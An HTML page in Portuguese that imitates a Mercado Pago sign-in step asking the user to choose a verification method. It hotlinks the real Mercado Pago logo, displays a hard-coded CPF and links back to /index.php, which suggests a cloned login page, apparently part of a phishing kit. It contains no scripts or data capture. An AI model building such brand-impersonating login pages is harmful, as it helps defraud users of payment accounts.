<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escolha um método de verificação</title>
    <style>
        /* Reset básico e estilos do Body */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #f5f5f5; 
        }

        /* Estilo do cabeçalho principal */
        .main-header {
            background-color: #ffe600;
            padding: 0 48px; /* Padding ajustado para ser mais responsivo */
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }

        .main-header img {
            height: 37px;
            vertical-align: middle;
        }

        /* Container principal que centraliza o conteúdo */
        .main-content {
            display: flex;
            justify-content: center; /* Centraliza a coluna na página */
            align-items: flex-start; 
            padding: 80px 24px 0 24px; /* Espaçamento do topo e laterais */
            flex-grow: 1;
        }
        
        /* Coluna da Esquerda */
        .left-column {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 340px; /* Largura máxima da coluna */
        }

        .session-start-label {
            font-size: 12px;
            font-weight: 600;
            color: #555;
            text-transform: uppercase;
            margin-bottom: 8px;
        }

        .main-title {
            font-size: 28px;
            font-weight: 400; /* Fonte normal, sem negrito */
            color: #333;
            line-height: 1.25;
            margin: 0; 
        }
        
        /* Card de identificação do usuário ("pílula") */
        .user-identifier-box {
            display: flex;
            align-items: center;
            gap: 16px;
            border: 1px solid rgba(0, 0, 0, .1);
            border-radius: 1.5625rem; /* 25px, para o formato de pílula */
            padding: 8px 12px;
            margin-top: 32px;
            width: fit-content; /* Largura se ajusta ao conteúdo */
        }

        .identifier-text-block {
            display: flex;
            flex-direction: column;
        }

        .identifier-text-block .cpf-text {
            font-size: 16px;
            font-weight: 400;
            color: #333;
        }

        .identifier-text-block .change-account-link {
            font-size: 14px;
            color: #3483fa;
            text-decoration: none;
            margin-top: 4px;
        }
        .identifier-text-block .change-account-link:hover { text-decoration: underline; }

        .help-link {
            display: block;
            margin-top: 24px;
            color: #3483fa;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .help-link:hover { text-decoration: underline; }

    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        
        <div class="left-column">
            
            <span class="session-start-label">INÍCIO DE SESSÃO</span>
            
            <h1 class="main-title">Escolha um método de verificação para iniciar sessão</h1>
            
            <div class="user-identifier-box">
                <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#333"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z" fill="currentColor"></path><path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z" fill="currentColor"></path></svg>
                <div class="identifier-text-block">
                    <span class="cpf-text">CPF: 288.114.198-67</span>
                    <a href="/index.php" class="change-account-link">Trocar conta</a>
                </div>
            </div>

            <a href="#" class="help-link">Preciso de ajuda</a>
        </div>
        
        </main>

</body>
</html>